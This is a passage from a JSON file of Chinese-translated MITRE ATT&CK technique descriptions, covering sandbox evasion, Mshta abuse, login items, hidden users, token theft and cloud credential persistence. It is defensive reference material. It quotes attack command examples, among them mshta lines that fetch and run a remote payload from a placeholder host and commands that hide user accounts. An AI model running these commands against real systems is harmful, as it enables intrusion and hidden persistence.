        "translated_description": "对手可能会采用各种方法检测和规避虚拟化和分析环境。这可能包括根据检查是否存在虚拟机环境 (VME) 或沙箱的工件的结果更改行为。如果对手检测到 VME，他们可能会更改其恶意软件以脱离受害者或隐藏植入物的核心功能。他们还可能在投放二级或其他有效载荷之前搜索 VME 工件。对手可能会在自动化发现期间使用从[虚拟化/沙箱规避](https://attack.mitre.org/techniques/T1497)中学到的信息来塑造后续行为。(引用: Deloitte Environment Awareness)\n\n对手可能会使用几种方法来实现[虚拟化/沙箱规避](https://attack.mitre.org/techniques/T1497)，例如检查安全监控工具（例如 Sysinternals、Wireshark 等）或与分析或虚拟化相关的其他系统工件。对手还可能检查合法用户活动以帮助确定是否在分析环境中。其他方法包括在恶意软件代码中使用睡眠计时器或循环以避免在临时沙箱中运行。(引用: Unit 42 Pirpi July 2015)"
    },
    "Web Service": {
        "translated_name": "Web 服务",
        "translated_description": "对手可能会使用现有的合法外部 Web 服务作为中继数据到/从受损系统的手段。流行的网站、云服务和社交媒体作为 C2 的机制可能会提供大量的掩护，因为网络中的主机在被破坏之前很可能已经在与它们通信。使用 Google、Microsoft 或 Twitter 提供的常见服务使对手更容易隐藏在预期的噪音中。(引用: Broadcom BirdyClient Microsoft Graph API 2024) Web 服务提供商通常使用 SSL/TLS 加密，为对手提供了额外的保护。\n\n使用 Web 服务还可以保护后端 C2 基础设施免于通过恶意软件二进制分析发现，同时还可以实现操作弹性（因为此基础设施可能会动态更改）。"
    },
    "Credentials In Files": {
        "translated_name": "文件中的凭据",
        "translated_description": "对手可能会搜索本地文件系统和远程文件共享中的文件，以查找不安全存储的凭据。这些文件可能是用户创建的用于存储其自身凭据的文件、共享凭据存储库、包含系统或服务密码的配置文件或包含嵌入密码的源代码/二进制文件。\n\n可以通过[操作系统凭据转储](https://attack.mitre.org/techniques/T1003)从备份或保存的虚拟机中提取密码。(引用: CG 2014) 密码也可以从存储在 Windows 域控制器上的组策略首选项中获取。(引用: SRD GPP)\n\n在云和/或容器化环境中，经过身份验证的用户和服务帐户凭据通常存储在本地配置和凭据文件中。(引用: Unit 42 Hildegard Malware) 它们也可能作为部署命令的参数出现在容器日志中。(引用: Unit 42 Unsecured Docker Daemons) 在某些情况下，这些文件可以被复制并在另一台机器上重用，或者可以读取其内容然后进行身份验证，而无需复制任何文件。(引用: Specter Ops - Cloud Credential Storage)"
    },
    "DNS Calculation": {
        "translated_name": "DNS 计算",
        "translated_description": "对手可能会对 DNS 结果中返回的地址进行计算，以确定用于命令和控制的端口和 IP 地址，而不是依赖预定的端口号或实际返回的 IP 地址。IP 和/或端口号计算可用于绕过 C2 通道上的出口过滤。(引用: Meyers Numbered Panda)\n\n[DNS 计算](https://attack.mitre.org/techniques/T1568/003) 的一种实现是获取 DNS 响应中 IP 地址的前三个八位字节，并使用这些值计算命令和控制流量的端口。(引用: Meyers Numbered Panda)(引用: Moran 2014)(引用: Rapid7G20Espionage)"
    },
    "Mshta": {
        "translated_name": "Mshta",
        "translated_description": "对手可能会滥用 mshta.exe 通过受信任的 Windows 实用程序代理执行恶意 .hta 文件和 Javascript 或 VBScript。有几个不同类型的威胁利用 mshta.exe 在初始妥协和代码执行期间。(引用: Cylance Dust Storm) (引用: Red Canary HTA Abuse Part Deux) (引用: FireEye Attacks Leveraging HTA) (引用: Airbus Security Kovter Analysis) (引用: FireEye FIN7 April 2017)\n\nMshta.exe 是一个执行 Microsoft HTML 应用程序 (HTA) 文件的实用程序。(引用: Wikipedia HTML Application) HTA 是独立应用程序，使用与 Internet Explorer 相同的模型和技术执行，但在浏览器之外。(引用: MSDN HTML Applications)\n\n文件可以通过内联脚本由 mshta.exe 执行：<code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\n它们也可以直接从 URL 执行：<code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe 可用于绕过未考虑其潜在滥用的应用程序控制解决方案。由于 mshta.exe 在 Internet Explorer 的安全上下文之外执行，它还绕过了浏览器安全设置。(引用: LOLBAS Mshta)"
    },
    "Login Items": {
        "translated_name": "登录项",
        "translated_description": "对手可能会添加登录项以在用户登录时执行，以获得持久性或提升权限。登录项是用户登录时自动启动的应用程序、文档、文件夹或服务器连接。(引用: Open Login Items Apple) 登录项可以通过共享文件列表或服务管理框架添加。(引用: Adding Login Items) 共享文件列表登录项可以使用脚本语言（如 [AppleScript](https://attack.mitre.org/techniques/T1059/002)）设置，而服务管理框架使用 API 调用 <code>SMLoginItemSetEnabled</code>。\n\n使用服务管理框架安装的登录项利用 <code>launchd</code>，在系统偏好设置中不可见，并且只能由创建它们的应用程序删除。(引用: Adding Login Items)(引用: SMLoginItemSetEnabled Schroeder 2013) 使用共享文件列表创建的登录项在系统偏好设置中可见，可以在启动时隐藏应用程序，并通过 LaunchServices 而不是 launchd 执行，以打开应用程序、文档或 URL，而无需使用 Finder。(引用: Launch Services Apple Developer) 用户和应用程序使用登录项来配置其用户环境，以启动常用的服务或应用程序，例如电子邮件、聊天和音乐应用程序。\n\n对手可以利用 [AppleScript](https://attack.mitre.org/techniques/T1059/002) 和 [Native API](https://attack.mitre.org/techniques/T1106) 调用创建登录项以生成恶意可执行文件。(引用: ELC Running at startup) 在 macOS 10.5 之前的版本中，对手可以使用 [AppleScript](https://attack.mitre.org/techniques/T1059/002) 向“系统事件”进程发送 Apple 事件来添加登录项，该进程具有用于操作登录项的 AppleScript 字典。(引用: Login Items AE) 对手可以使用命令 <code>tell application “System Events” to make login item at end with properties /path/to/executable</code>。(引用: Startup Items Eclectic)(引用: hexed osx.dok analysis 2019)(引用: Add List Remove Login Items Apple Script) 此命令将恶意可执行文件的路径添加到位于 <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code> 的登录项文件列表中。(引用: Startup Items Eclectic) 对手还可以使用登录项启动可用于远程控制受害者系统的可执行文件，或通过提示用户凭据来获得权限提升。(引用: objsee mac malware 2017)(引用: CheckPoint Dok)(引用: objsee netwire backdoor 2019)"
    },
    "Stage Capabilities": {
        "translated_name": "阶段能力",
        "translated_description": "对手可能会上传、安装或以其他方式设置可在目标过程中使用的能力。为了支持他们的操作，对手可能需要将他们开发的能力 ([开发能力](https://attack.mitre.org/techniques/T1587)) 或获得的能力 ([获取能力](https://attack.mitre.org/techniques/T1588)) 阶段性地部署在他们控制的基础设施上。这些能力可能会部署在对手之前购买/租用的基础设施上 ([获取基础设施](https://attack.mitre.org/techniques/T1583)) 或被他们以其他方式妥协的基础设施上 ([妥协基础设施](https://attack.mitre.org/techniques/T1584))。能力也可以部署在 Web 服务上，例如 GitHub 或 Pastebin，或在用户可以轻松配置应用程序的平台即服务 (PaaS) 提供商上。(引用: Volexity Ocean Lotus November 2020)(引用: Dragos Heroku Watering Hole)(引用: Malwarebytes Heroku Skimmers)(引用: Netskope GCP Redirection)(引用: Netskope Cloud Phishing)\n\n能力的阶段性部署可以帮助对手进行许多初始访问和妥协后的行为，包括但不限于：\n\n* 部署必要的 Web 资源以进行 [驱动器式妥协](https://attack.mitre.org/techniques/T1189) 当用户浏览到站点时。(引用: FireEye CFR Watering Hole 2012)(引用: Gallagher 2015)(引用: ATT ScanBox)\n* 部署 Web 资源以用于鱼叉式网络钓鱼链接目标。(引用: Malwarebytes Silent Librarian October 2020)(引用: Proofpoint TA407 September 2019)\n* 将恶意软件或工具上传到受害者网络可访问的位置，以启用 [入口工具传输](https://attack.mitre.org/techniques/T1105)。(引用: Volexity Ocean Lotus November 2020)\n* 安装先前获取的 SSL/TLS 证书以用于加密命令和控制流量（例如：[非对称加密](https://attack.mitre.org/techniques/T1573/002) 与 [Web 协议](https://attack.mitre.org/techniques/T1071/001)）。(引用: DigiCert Install SSL Cert)"
    },
    "Link Target": {
        "translated_name": "链接目标",
        "translated_description": "对手可能会设置链接引用的资源，以便在目标过程中使用。对手可能依赖用户点击恶意链接以泄露信息（包括凭据）或获得执行权限，如 [恶意链接](https://attack.mitre.org/techniques/T1204/001)。链接可用于鱼叉式网络钓鱼，例如发送带有社会工程文本的电子邮件，以诱使用户主动点击或复制并粘贴 URL 到浏览器。在进行信息钓鱼（如 [鱼叉式网络钓鱼链接](https://attack.mitre.org/techniques/T1598/003)）或系统初始访问（如 [鱼叉式网络钓鱼链接](https://attack.mitre.org/techniques/T1566/002)）之前，对手必须设置鱼叉式网络钓鱼链接的链接目标资源。\n\n通常，链接目标的资源将是一个 HTML 页面，可能包含一些客户端脚本，例如 [JavaScript](https://attack.mitre.org/techniques/T1059/007)，以决定向用户提供什么内容。对手可能会克隆合法站点以作为链接目标，这可能包括克隆合法 Web 服务或组织登录页面，以在 [鱼叉式网络钓鱼链接](https://attack.mitre.org/techniques/T1598/003) 期间收集凭据。(引用: Malwarebytes Silent Librarian October 2020)(引用: Proofpoint TA407 September 2019) 对手还可能 [上传恶意软件](https://attack.mitre.org/techniques/T1608/001) 并让链接目标指向用户下载/执行的恶意软件。\n\n对手可能会购买类似于合法域名的域名（例如：同形异义字、拼写错误、不同的顶级域名等）在获取基础设施期间 ([域名](https://attack.mitre.org/techniques/T1583/001)) 以帮助进行 [恶意链接](https://attack.mitre.org/techniques/T1204/001)。\n\n对手可以编写链接以掩盖真实目的地，以通过滥用 URL 架构欺骗受害者并提高钓鱼的有效性。(引用: Kaspersky-masking)(引用: mandiant-masking)\n\n对手还可以使用链接缩短服务和平台即服务提供商上的免费或付费账户来托管链接目标，同时利用这些提供商的广泛信任域来避免被阻止，同时将受害者重定向到恶意页面。(引用: Netskope GCP Redirection)(引用: Netskope Cloud Phishing)(引用: Intezer App Service Phishing)(引用: Cofense-redirect) 此外，对手可能通过唯一生成的 URI/URL（包括一次性、单次使用链接）提供各种恶意链接。(引用: iOS URL Scheme)(引用: URI)(引用: URI Use)(引用: URI Unique) 最后，对手可能利用星际文件系统 (IPFS) 的去中心化特性来托管难以删除的链接目标。(引用: Talos IPFS 2022)"
    },
    "Multi-Stage Channels": {
        "translated_name": "多阶段通道",
        "translated_description": "对手可能会创建多个阶段的命令和控制通道，这些通道在不同条件下或用于某些功能时使用。使用多个阶段可能会混淆命令和控制通道，使检测更加困难。\n\n远程访问工具将回调到第一阶段的命令和控制服务器以获取指令。第一阶段可能具有自动化功能，以收集基本主机信息、更新工具和上传其他文件。此时可能会上传第二个远程访问工具 (RAT) 以将主机重定向到第二阶段的命令和控制服务器。第二阶段可能功能更全面，允许对手通过反向 shell 和其他 RAT 功能与系统交互。\n\n不同阶段可能会分别托管，没有重叠的基础设施。加载程序还可能具有备用的第一阶段回调或 [回退通道](https://attack.mitre.org/techniques/T1008)，以防原始的第一阶段通信路径被发现和阻止。"
    },
    "Financial Theft": {
        "translated_name": "金融盗窃",
        "translated_description": "攻击者可能会通过勒索、社会工程、技术盗窃或其他手段从目标手中窃取金钱资源，以获取自身的经济利益，而牺牲受害者使用这些资源的利益。金融盗窃是几种流行活动类型的最终目标，包括勒索软件敲诈勒索、(引文：FBI-ransomware)、商业电子邮件泄露 (BEC) 和欺诈、(引文：FBI-BEC)、“杀猪”、“(引文：wired-pig butchering) 银行黑客攻击、(引文：DOJ-DPRK Heist) 和利用加密货币网络。(引文：BBC-Ronin) \n\n攻击者可能会 [入侵账户](https://attack.mitre.org/techniques/T1586) 进行未经授权的资金转移。(引文：互联网犯罪报告 2022) 在商业电子邮件泄露或电子邮件欺诈的情况下，攻击者可能会利用可信实体的 [模仿](https://attack.mitre.org/techniques/T1656)。一旦社会工程学成功，受害者就会被欺骗将钱汇到对手控制的金融账户中。(引文：FBI-BEC) 这就有可能在涉及金融盗窃的事件中造成多名受害者（即账户被盗以及最终的金钱损失）。(引文：VEC)\n\n例如，当对手在 [数据加密以产生影响](https://attack.mitre.org/techniques/T1486) (引文：NYT-Colonial) 和 [数据渗漏](https://attack.mitre.org/tactics/TA0010) 之后要求受害者付款，然后威胁说，如果不向对手付款，就会向公众泄露敏感数据，这时就可能发生勒索软件敲诈。(引文：Mandiant-leaks) 对手可能会使用专门的泄密网站来分发受害者数据。(引文：Crowdstrike-leaks)\n\n由于潜在的巨大业务影响金融盗窃，攻击者可能会滥用金融盗窃的可能性并寻求金钱利益来转移对其真正目标（例如 [数据破坏](https://attack.mitre.org/techniques/T1485) 和业务中断）的注意力。（引文：AP-NotPetya）"
    },
    "Execution Guardrails": {
        "translated_name": "执行护栏",
        "translated_description": "对手可能会使用执行护栏来根据对手提供的和目标环境中特定的条件来限制执行或操作。护栏确保有效载荷仅针对预期目标执行，并减少对手活动的附带损害。(引用: FireEye Kevin Mandia Guardrails) 对手可以提供的关于目标系统或环境的值以用作护栏可能包括特定的网络共享名称、连接的物理设备、文件、加入的 Active Directory (AD) 域和本地/外部 IP 地址。(引用: FireEye Outlook Dec 2019)\n\n护栏可用于防止在不打算妥协或操作的环境中暴露能力。这种护栏的使用与典型的[虚拟化/沙箱规避](https://attack.mitre.org/techniques/T1497)不同。虽然[虚拟化/沙箱规避](https://attack.mitre.org/techniques/T1497)可能涉及检查已知的沙箱值并仅在没有匹配时继续执行，但护栏的使用将涉及检查预期的目标特定值，并仅在存在匹配时继续执行。\n\n对手可能会识别并阻止某些用户代理以规避防御，并将攻击范围缩小到最有效的受害者和平台。用户代理自我标识数据，例如用户的软件应用程序、操作系统、供应商和版本。对手可能会检查用户代理以识别操作系统，然后仅为可利用的软件提供恶意软件，而忽略所有其他操作系统。(引用: Trellix-Qakbot)"
    },
    "Cloud Storage Object Discovery": {
        "translated_name": "云存储对象发现",
        "translated_description": "对手可能会枚举云存储基础设施中的对象。对手可能在自动化发现期间使用此信息来塑造后续行为，包括从云存储请求所有或特定对象。类似于本地主机上的[文件和目录发现](https://attack.mitre.org/techniques/T1083)，在识别可用的存储服务（即[云基础设施发现](https://attack.mitre.org/techniques/T1580)）后，对手可能会访问存储在云基础设施中的内容/对象。\n\n云服务提供商提供 API，允许用户枚举存储在云存储中的对象。示例包括 AWS 中的 ListObjectsV2 (引用: ListObjectsV2) 和 Azure 中的 List Blobs (引用: List Blobs)。"
    },
    "Web Cookies": {
        "translated_name": "Web Cookies",
        "translated_description": "对手可能会伪造可用于访问 Web 应用程序或互联网服务的 Web cookies。Web 应用程序和服务（托管在云 SaaS 环境或本地服务器上）通常使用会话 cookies 来验证和授权用户访问。\n\n对手可能会生成这些 cookies 以访问 Web 资源。这与[窃取 Web 会话 Cookie](https://attack.mitre.org/techniques/T1539)和其他类似行为不同，因为这些 cookies 是由对手新生成的，而不是从合法用户那里窃取或拦截的。大多数常见的 Web 应用程序都有标准化和记录的 cookie 值，可以使用提供的工具或接口生成。(引用: Pass The Cookie) 生成 Web cookies 通常需要秘密值，例如密码、[私钥](https://attack.mitre.org/techniques/T1552/004)或其他加密种子值。\n\n一旦伪造，对手可能会使用这些 Web cookies 访问资源（[Web 会话 Cookie](https://attack.mitre.org/techniques/T1550/004)），这可能绕过多因素和其他身份验证保护机制。(引用: Volexity SolarWinds)(引用: Pass The Cookie)(引用: Unit 42 Mac Crypto Cookies January 2019)"
    },
    "Log Enumeration": {
        "translated_name": "日志枚举",
        "translated_description": "对手可能会枚举系统和服务日志以查找有用的数据。这些日志可能会为对手提供各种有价值的见解，例如用户身份验证记录（[账户发现](https://attack.mitre.org/techniques/T1087)）、安全或易受攻击的软件（[软件发现](https://attack.mitre.org/techniques/T1518)）或受损网络中的主机（[远程系统发现](https://attack.mitre.org/techniques/T1018)）。\n\n主机二进制文件可能会被用来收集系统日志。示例包括在 Windows 上使用 `wevtutil.exe` 或 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 访问和/或导出安全事件信息。(引用: WithSecure Lazarus-NoPineapple Threat Intel Report 2023)(引用: Cadet Blizzard emerges as novel threat actor) 在云环境中，对手可能会利用 Azure VM Agent 的 `CollectGuestLogs.exe` 实用程序从云托管基础设施中收集安全日志。(引用: SIM Swapping and Abuse of the Microsoft Azure Serial Console)\n\n对手还可能针对集中日志基础设施，例如 SIEM。日志也可能被批量导出并发送到对手控制的基础设施进行离线分析。\n\n除了更好地了解环境外，对手还可能实时监控日志以跟踪事件响应程序。这可能使他们能够调整其技术以保持持久性或规避防御。(引用: Permiso GUI-Vil 2023)"
    },
    "Token Impersonation/Theft": {
        "translated_name": "令牌模拟/盗用",
        "translated_description": "对手可能会复制然后模拟其他用户的现有令牌以提升权限并绕过访问控制。例如，对手可以使用 `DuplicateToken` 或 `DuplicateTokenEx` 复制现有令牌。(引用: DuplicateToken function) 然后可以使用 `ImpersonateLoggedOnUser` 允许调用线程模拟已登录用户的安全上下文，或使用 `SetThreadToken` 将模拟的令牌分配给线程。\n\n当对手有特定的现有进程要分配复制的令牌时，可能会执行[令牌模拟/盗用](https://attack.mitre.org/techniques/T1134/001)。例如，当目标用户在系统上有非网络登录会话时，这可能很有用。\n\n当对手使用复制的令牌创建新进程而不是附加到现有进程时，他们还可以使用 `CreateProcessWithTokenW` 或 `CreateProcessAsUserW` [使用令牌创建进程](https://attack.mitre.org/techniques/T1134/002)。[令牌模拟/盗用](https://attack.mitre.org/techniques/T1134/001) 也与[创建和模拟令牌](https://attack.mitre.org/techniques/T1134/003)不同，因为它指的是复制现有令牌，而不是创建新令牌。"
    },
    "Exfiltration to Code Repository": {
        "translated_name": "外传到代码库",
        "translated_description": "对手可能会将数据外传到代码库，而不是通过其主要命令和控制通道。代码库通常可以通过 API 访问（例如：https://api.github.com）。访问这些 API 通常通过 HTTPS，这为对手提供了额外的保护。\n\n将数据外传到代码库还可以为对手提供大量掩护，如果它是网络中主机已经使用的流行服务。"
    },
    "Cloud Services": {
        "translated_name": "云服务",
        "translated_description": "对手可能会使用与本地用户身份同步或联合的[有效帐户](https://attack.mitre.org/techniques/T1078)登录到受损环境中的可访问云服务。然后，对手可能会执行管理操作或以登录用户的身份访问云托管资源。\n\n许多企业将集中管理的用户身份联合到云服务，允许用户使用其域凭据登录以访问云控制平面。同样，对手可能通过 Web 控制台或云命令行界面 (CLI) 连接到可用的云服务，例如使用 <code>Connect-AZAccount</code> 进行 Azure PowerShell，<code>Connect-MgGraph</code> 进行 Microsoft Graph PowerShell，以及 <code>gcloud auth login</code> 进行 Google Cloud CLI。\n\n在某些情况下，对手可能能够通过[应用程序访问令牌](https://attack.mitre.org/techniques/T1550/001)而不是用户名和密码进行身份验证。"
    },
    "Port Knocking": {
        "translated_name": "端口敲击",
        "translated_description": "对手可能会使用端口敲击来隐藏用于持久性或命令和控制的开放端口。为了启用端口，对手会向一系列预定义的关闭端口发送一系列尝试连接。在完成序列后，通常由主机防火墙打开端口，但也可以由自定义软件实现。\n\n这种技术已被观察到用于动态打开监听端口以及在不同系统上启动与监听服务器的连接。\n\n可以通过不同的方法观察触发通信的信号包。一种方法，最初由 Cd00r 实现 (引用: Hartrell cd00r 2002)，是使用 libpcap 库嗅探相关数据包。另一种方法利用原始套接字，使恶意软件能够使用其他程序已打开的端口。"
    },
    "LNK Icon Smuggling": {
        "translated_name": "LNK 图标走私",
        "translated_description": "对手可能会通过将命令隐藏在看似无害的 Windows 快捷方式文件中来绕过内容过滤器，下载恶意有效载荷。Windows 快捷方式文件 (.LNK) 包含许多元数据字段，包括用于指定要在主机目录中显示的 LNK 文件图标文件路径的图标位置字段（也称为 `IconEnvironmentDataBlock`）。\n\n对手可能会滥用这些 LNK 元数据来下载恶意有效载荷。例如，对手已被观察到使用 LNK 文件作为网络钓鱼有效载荷来投放恶意软件。一旦调用（例如，[恶意文件](https://attack.mitre.org/techniques/T1204/002)），通过 LNK 图标位置字段中的外部 URL 引用的有效载荷可能会被下载。这些文件也可能通过 LNK 目标路径字段中的[命令和脚本解释器](https://attack.mitre.org/techniques/T1059)/[系统二进制代理执行](https://attack.mitre.org/techniques/T1218)参数调用。\n\nLNK 图标走私也可能在妥协后使用，例如恶意脚本在受感染主机上执行 LNK 以下载其他恶意有效载荷。"
    },
    "Web Services": {
        "translated_name": "Web 服务",
        "translated_description": "对手可能会妥协访问可以在目标过程中使用的第三方 Web 服务。存在各种流行的网站供合法用户注册 Web 服务，例如 GitHub、Twitter、Dropbox、Google、SendGrid 等。对手可能会尝试接管合法用户对 Web 服务的访问，并将该 Web 服务用作支持网络操作的基础设施。此类 Web 服务可以在对手生命周期的后期阶段被滥用，例如在命令和控制（[Web 服务](https://attack.mitre.org/techniques/T1102)）、[通过 Web 服务外传](https://attack.mitre.org/techniques/T1567)或[网络钓鱼](https://attack.mitre.org/techniques/T1566)期间。使用 Google 或 Twitter 提供的常见服务使对手更容易隐藏在预期的噪音中。通过利用 Web 服务，特别是当访问是从合法用户那里窃取时，对手可以使其操作难以追踪。此外，利用被妥协的基于 Web 的电子邮件服务可能允许对手利用与合法域相关的信任。"
    },
    "Steal Application Access Token": {
        "translated_name": "窃取应用程序访问令牌",
        "translated_description": "对手可以窃取应用程序访问令牌作为获取凭据以访问远程系统和资源的一种手段。\n\n应用程序访问令牌用于代表用户或服务进行授权的 API 请求，通常用于访问云和基于容器的应用程序以及软件即服务 (SaaS) 中的资源。(引用: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) 窃取账户 API 令牌的对手可能能够以这些账户的权限访问数据和执行操作，这可能导致权限提升和进一步妥协环境。\n\n例如，在 Kubernetes 环境中，运行在容器内的进程可能使用服务账户令牌与 Kubernetes API 服务器通信。如果容器被妥协，对手可能能够窃取容器的令牌，从而获得 Kubernetes API 命令的访问权限。(引用: Kubernetes Service Accounts) 同样，在持续开发/持续集成 (CI/CD) 管道中，实例通常使用 API 令牌进行身份验证以测试和部署。(引用: Cider Security Top 10 CICD Security Risks) 如果这些管道被妥协，对手可能能够窃取这些令牌并利用其权限。\n\n令牌窃取也可能通过社会工程发生，在这种情况下可能需要用户操作以授予访问权限。OAuth 是一种常见的实现框架，向用户发放令牌以访问系统。希望访问云服务或受保护 API 的应用程序可以通过各种授权协议使用 OAuth 2.0 进行访问。一个常见的示例是 Microsoft 的授权代码授予流程。(引用: Microsoft Identity Platform Protocols May 2019)(引用: Microsoft - OAuth Code Authorization flow - June 2019) OAuth 访问令牌使第三方应用程序能够以请求的方式与包含用户数据的资源进行交互，而无需获取用户凭据。\n\n对手可以通过构建一个恶意应用程序来利用 OAuth 授权，该应用程序旨在获得目标用户的 OAuth 令牌访问资源。(引用: Amnesty OAuth Phishing Attacks, August 2019)(引用: Trend Micro Pawn Storm OAuth 2017) 对手需要完成其应用程序在授权服务器上的注册，例如使用 Azure Portal、Visual Studio IDE、命令行界面、PowerShell 或 REST API 调用进行 Microsoft Identity Platform 注册。(引用: Microsoft - Azure AD App Registration - May 2019) 然后，他们可以发送[鱼叉式网络钓鱼链接](https://attack.mitre.org/techniques/T1566/002)给目标用户，诱使他们授予应用程序访问权限。一旦授予 OAuth 访问令牌，应用程序可以通过[应用程序访问令牌](https://attack.mitre.org/techniques/T1550/001)获得对用户账户功能的长期访问权限。(引用: Microsoft - Azure AD Identity Tokens - Aug 2019)\n\n应用程序访问令牌可能在有限的生命周期内有效，限制对手利用被窃取令牌的时间。然而，在某些情况下，对手也可以窃取应用程序刷新令牌(引用: Auth0 Understanding Refresh Tokens)，允许他们在不提示用户的情况下获取新的访问令牌。"
    },
    "Additional Cloud Credentials": {
        "translated_name": "额外的云凭据",
        "translated_description": "对手可能会向云账户添加对手控制的凭据，以保持对受害者账户和环境中实例的持续访问。\n\n例如，对手可能会向 Azure / Entra ID 中的服务主体和应用程序添加凭据，除了现有的合法凭据之外。(引用: Microsoft SolarWinds Customer Guidance)(引用: Blue Cloud of Death)(引用: Blue Cloud of Death Video) 这些凭据包括 x509 密钥和密码。(引用: Microsoft SolarWinds Customer Guidance) 在具有足够权限的情况下，有多种方法可以添加凭据，包括 Azure Portal、Azure 命令行界面和 Azure 或 Az PowerShell 模块。(引用: Demystifying Azure AD Service Principals)\n\n在基础设施即服务 (IaaS) 环境中，在通过[云账户](https://attack.mitre.org/techniques/T1078/004)获得访问权限后，对手可能会使用 AWS 中的 <code>CreateKeyPair</code> 或 <code>ImportKeyPair</code> API 或 GCP 中的 <code>gcloud compute os-login ssh-keys add</code> 命令生成或导入自己的 SSH 密钥。这允许在不进一步使用被妥协的云账户的情况下持续访问环境中的实例。(引用: Expel IO Evil in AWS)(引用: Expel Behind the Scenes)\n\n对手还可能使用 AWS 中的 <code>CreateAccessKey</code> API 或 GCP 中的 <code>gcloud iam service-accounts keys create</code> 命令向账户添加访问密钥。或者，他们可能使用 AWS 中的 <code>CreateLoginProfile</code> API 添加一个密码，该密码可用于登录 AWS 管理控制台以进行[云服务仪表板](https://attack.mitre.org/techniques/T1538)。(引用: Permiso Scattered Spider 2023)(引用: Lacework AI Resource Hijacking 2024) 如果目标账户的权限与请求账户不同，对手也可能能够在环境中提升其权限（即[云账户](https://attack.mitre.org/techniques/T1078/004)）。(引用: Rhino Security Labs AWS Privilege Escalation)(引用: Sysdig ScarletEel 2.0) 例如，在 Entra ID 环境中，具有应用程序管理员角色的对手可以向其应用程序的服务主体添加一组新的凭据。通过这样做，对手将能够访问服务主体的角色和权限，这些角色和权限可能与应用程序管理员的不同。(引用: SpecterOps Azure Privilege Escalation)\n\n在 AWS 环境中，具有适当权限的对手还可以使用 `sts:GetFederationToken` API 调用创建一组临时凭据，以[伪造 Web 凭据](https://attack.mitre.org/techniques/T1606)，这些凭据与原始用户账户的权限相关联。这些临时凭据可能在其生命周期内保持有效，即使原始账户的 API 凭据被停用。\n(引用: Crowdstrike AWS User Federation Persistence)\n\n在启用了应用程序密码功能的 Entra ID 环境中，对手可能能够向用户账户添加应用程序密码。(引用: Mandiant APT42 Operations 2024) 由于应用程序密码旨在用于不支持多因素身份验证 (MFA) 的旧设备，添加应用程序密码可以允许对手绕过 MFA 要求。此外，即使用户的主密码被重置，应用程序密码也可能保持有效。(引用: Microsoft Entra ID App Passwords)"
    },
    "User Execution": {
        "translated_name": "用户执行",
        "translated_description": "对手可能依赖用户的特定操作来获得执行权限。用户可能会受到社会工程的影响，执行恶意代码，例如打开恶意文档文件或链接。这些用户操作通常会作为[网络钓鱼](https://attack.mitre.org/techniques/T1566)的后续行为被观察到。\n\n虽然[用户执行](https://attack.mitre.org/techniques/T1204)通常发生在初始访问之后不久，但它也可能发生在入侵的其他阶段，例如当对手将文件放置在共享目录或用户桌面上，希望用户点击它时。这种活动也可能在[内部鱼叉式网络钓鱼](https://attack.mitre.org/techniques/T1534)之后不久被看到。\n\n对手还可能欺骗用户执行以下操作：\n\n* 启用[远程访问软件](https://attack.mitre.org/techniques/T1219)，允许对手直接控制系统\n* 在浏览器中运行恶意JavaScript，允许对手[窃取Web会话Cookie](https://attack.mitre.org/techniques/T1539)(引用: Talos Roblox Scam 2023)(引用: Krebs Discord Bookmarks 2023)\n* 下载并执行恶意软件以进行[用户执行](https://attack.mitre.org/techniques/T1204)\n* 强迫用户手动复制、粘贴并执行恶意代码(引用: Reliaquest-execution)(引用: proofpoint-selfpwn)\n\n例如，技术支持骗局可以通过[网络钓鱼](https://attack.mitre.org/techniques/T1566)、语音钓鱼或各种形式的用户交互来促进。对手可以使用这些方法的组合，例如欺骗和推广免费电话号码或呼叫中心，用于引导受害者访问恶意网站，以交付和执行包含恶意软件或[远程访问软件](https://attack.mitre.org/techniques/T1219)的有效载荷。(引用: Telephone Attack Delivery)"
    },
    "Internal Defacement": {
        "translated_name": "内部篡改",
        "translated_description": "对手可能会篡改组织内部的系统，试图恐吓或误导用户，从而破坏系统的完整性。这可能采取修改内部网站或直接替换用户系统桌面壁纸的形式。(引用: Novetta Blockbuster) 令人不安或冒犯的图像可能作为[内部篡改](https://attack.mitre.org/techniques/T1491/001)的一部分使用，以引起用户的不适，或通过附带的信息施加压力。由于内部篡改系统会暴露对手的存在，它通常在完成其他入侵目标后进行。(引用: Novetta Blockbuster Destructive Malware)"
    },
    "Hidden Users": {
        "translated_name": "隐藏用户",
        "translated_description": "对手可能使用隐藏用户来隐藏他们创建或修改的用户账户的存在。管理员可能希望在系统上有许多用户账户时隐藏用户，或者希望将他们的管理或其他管理账户隐藏起来。\n\n在macOS中，对手可以通过操作plist文件、文件夹属性和用户属性来创建或修改隐藏用户。为了防止用户在登录屏幕和系统偏好设置中显示，对手可以将userID设置为500以下，并在<code>/Library/Preferences/com.apple.loginwindow</code> plist文件中将键值<code>Hide500Users</code>设置为<code>TRUE</code>。(引用: Cybereason OSX Pirrit) 每个用户都有一个与之关联的userID。当<code>Hide500Users</code>键值设置为<code>TRUE</code>时，userID低于500的用户不会出现在登录屏幕和系统偏好设置中。使用命令行，对手可以使用<code>dscl</code>实用程序通过将<code>IsHidden</code>属性设置为<code>1</code>来创建隐藏用户账户。对手还可以通过将<code>chflags</code>更改为隐藏来隐藏用户的主文件夹。(引用: Apple Support Hide a User Account)\n\n对手也可能在Windows中类似地隐藏用户账户。对手可以将<code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code>注册表键值设置为<code>0</code>，以防止特定用户出现在登录屏幕上。(引用: FireEye SMOKEDHAM June 2021)(引用: US-CERT TA18-074A)\n\n在Linux系统上，对手可能会隐藏登录屏幕上的用户账户，也称为greeter。对手可能使用的方法取决于发行版当前使用的显示管理器。例如，在使用GNOME显示管理器（GDM）的Ubuntu系统上，可以使用<code>gsettings</code>命令隐藏greeter中的账户（例如：<code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>）。(引用: Hide GDM User Accounts) 显示管理器不固定在特定的发行版上，用户或对手可以更改它们。"
    },
    "Make and Impersonate Token": {
        "translated_name": "创建和模拟令牌",
